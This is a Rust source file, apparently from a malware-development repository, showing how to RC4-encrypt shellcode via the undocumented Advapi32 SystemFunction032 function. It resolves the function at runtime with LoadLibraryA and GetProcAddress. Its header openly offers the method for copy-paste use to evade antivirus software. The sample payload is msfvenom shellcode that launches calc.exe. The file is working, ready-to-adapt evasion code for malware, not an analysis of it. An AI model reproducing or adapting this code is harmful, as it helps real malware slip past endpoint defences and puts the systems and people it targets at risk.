/*
This is an actual implementation of encrypting shellcode using RC4 Encryption .. Just an POC. 
You can copy paste this method  to evade AV's 

For More codes : https://github.com/Whitecat18/Rust-for-Malware-Development.git
@5mukx

*/   

// use std::ptr;
// use winapi::shared::ntdef::NULL;

use winapi::{
    shared::{bcrypt::NTSTATUS, minwindef::DWORD, ntdef::{LPCSTR, PVOID}}, 
    um::libloaderapi::{GetProcAddress, LoadLibraryA}};


#[repr(C)]
#[allow(non_snake_case)]
struct USTRING{
    Length: u32,
    MaximumLength: u32,
    Buffer: PVOID,
}


// ntstatus is nothing but long -> c_long -> i32
type FNSYSTEMFUNCTION032 = extern "system" fn(*mut USTRING, *mut USTRING) -> NTSTATUS;

fn rc4_encryption_vi_system_func032(p_rc4_key: *mut u8, p_payload_data: *mut u8, dw_rc4_key_size: DWORD, s_payload_size: DWORD) -> bool {
    // let mut status: NTSTATUS = 0;
    let mut key = USTRING {
        Buffer: p_rc4_key as PVOID,
        Length: dw_rc4_key_size,
        MaximumLength: dw_rc4_key_size, 
    };

    let mut img = USTRING {
        Buffer: p_payload_data as PVOID,
        Length: s_payload_size,
        MaximumLength: s_payload_size,
    };

//  SystemFunction032 is exported from Advapi32.dll, use LoadLibraryA to load Advapi32.dll into the process, 
    let advapi32_handle = unsafe { LoadLibraryA(b"Advapi32\0".as_ptr() as LPCSTR) };

    if advapi32_handle.is_null(){
        println!("[-] Failed to Load Advapi32.dll");
        return false;
    }

    let systemfunction_032: FNSYSTEMFUNCTION032 = unsafe{
        let func_ptr = GetProcAddress(advapi32_handle, b"SystemFunction032\0".as_ptr() as LPCSTR);
        if func_ptr.is_null(){
            println!("[-] Failed to get address of SystemFunction032");
            return false;
        }
        std::mem::transmute(func_ptr)
    };
    if {systemfunction_032(&mut img as *mut USTRING, &mut key as *mut USTRING)} != 0x0 {
        println!("[-] SystemFunction32 FAILED");
        return false;
    }
    true
}

fn print_hex_data(name: &str, data: *const u8, size: usize){
    println!("ctype hex_Data {}[] = {{",name);
    for i in 0..size{
        if i % 16 == 0{
            print!("\n\t");
        }
        if i < size -1 {
            print!("0x{:02X}, ", unsafe { *data.add(i)});
        }else{
            print!("0x{:02X} ", unsafe { *data.add(i)}); 
        }
    }
    println!("}};\n\n");
}

fn main(){

    // calc shellcode generated from msfvenom !
    let enc_shellcode = [0xfc,0x48,0x83,0xe4,0xf0,0xe8,
    0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
    0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
    0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
    0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
    0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
    0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,
    0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
    0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
    0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
    0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
    0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
    0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
    0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
    0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
    0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
    0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
    0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,
    0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,
    0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,
    0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,
    0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
    0x63,0x2e,0x65,0x78,0x65,0x00];

    // enter the key using some hex CString format ! 
    let key = [
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,
    ];

    println!("[+] Shellcode: {:?}", &enc_shellcode as *const _);
    println!("[#] Press <Enter to Decrypt ...");

    let _ = std::io::stdin().read_line(&mut String::new());

    if !rc4_encryption_vi_system_func032(
        key.as_ptr() as *mut _, 
        enc_shellcode.as_ptr() as *mut u8,
        key.len() as DWORD,
        enc_shellcode.len() as DWORD){
        return;
    }
    
    print_hex_data("Shellcode", enc_shellcode.as_ptr(), enc_shellcode.len());
    println!("[#] Press <Enter> To Quit ...");
    
    let _ = std::io::stdin().read_line(&mut String::new());
}

